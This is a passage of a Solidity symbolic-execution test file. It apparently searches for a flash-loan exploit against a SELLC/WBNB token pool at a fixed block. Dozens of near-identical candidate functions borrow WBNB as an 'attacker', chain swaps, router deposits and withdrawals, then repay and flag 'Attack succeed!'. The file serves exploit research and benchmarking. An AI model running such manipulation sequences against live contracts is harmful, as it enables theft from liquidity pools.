        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        withdraw_srouter_sellc_wbnb(amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand106(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand107(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand108(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand109(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand110(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand111(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand112(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand113(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
